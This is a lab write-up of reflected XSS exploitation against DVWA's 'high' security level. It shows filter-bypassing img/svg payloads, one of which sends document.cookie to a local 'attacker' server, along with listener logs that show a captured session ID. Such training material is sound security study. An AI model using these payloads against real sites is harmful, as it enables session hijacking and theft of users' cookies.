# Cross-site Scripting (XSS) (High Level)

## Vulnerability Overview

At the high-security level, DVWA attempts to prevent Cross-Site Scripting (XSS) by applying a basic filter using `preg_replace()`. This filter is designed to remove any part of the input that matches the word `script`, targeting typical `<script>` tags.

### Weakness of the Filtering Method
- The filtering is case-insensitive but only looks for the word `script`.
- It does not sanitize other forms of JavaScript injection.
- The application reflects modified input directly into the page without proper encoding.
- The HTTP header disables the browser's built-in XSS protection (`X-XSS-Protection: 0`).

### Summary
Even though DVWA attempts to block script-based XSS with regex filtering, the protection is ineffective due to poor sanitization and output encoding. This makes the application highly vulnerable to modern XSS attacks.

---

# Exploitation

## 1. Triggering JavaScript Execution via XSS

**Payload Used:**
```html
<img src=x onerror="alert('You have been hacked')">
```

This payload uses an `<img>` tag with an invalid `src` attribute, causing a loading error and triggering the `onerror` event. The event executes JavaScript that displays an alert message "You have been hacked".

The payload was reflected in the HTML source code, confirming that arbitrary script execution was possible.

---

## 2. Capturing the Victim’s Session Cookie

**Payload Used:**
```html
<img src/onerror=alert(document.cookie)>
```

This payload demonstrates how an attacker could use XSS to steal a user's session cookie.
- When a victim accesses a URL with this payload, an alert pops up displaying the session cookie.
- In a real-world attack, this method could be combined with phishing to hijack user sessions.

---

## 3. Exfiltrating Cookies to an Attacker-Controlled Server

**Payload Used:**
```html
<svg onload="window.location='http://127.0.0.1:1337/?cookie='+document.cookie">
```

This advanced payload exfiltrates the session cookie to an external server.

### Steps Taken:
1. A local HTTP server was started on port 1337 using the following command:
```bash
python -m http.server 1337
```
2. When the payload executed in the victim's browser, it redirected to the attacker's server with the cookie attached as a query string.

### Result:
- Successfully captured the victim's session ID and cookie data.
- Example server log output:
```text
127.0.0.1 - - [25/Mar/2025 14:58:05] "GET /?cookie=security=high;%20PHPSESSID=p7l63b0bklhsret7raqdjfgpcv HTTP/1.1" 200 -
127.0.0.1 - - [25/Mar/2025 14:58:05] "GET /favicon.ico HTTP/1.1" 404 -
```
- This confirms that the attacker's server received the session cookie, enabling potential session hijacking.

---

# ✅ Done!

This concludes the Cross-site Scripting (XSS) exploitation on DVWA at high security level.
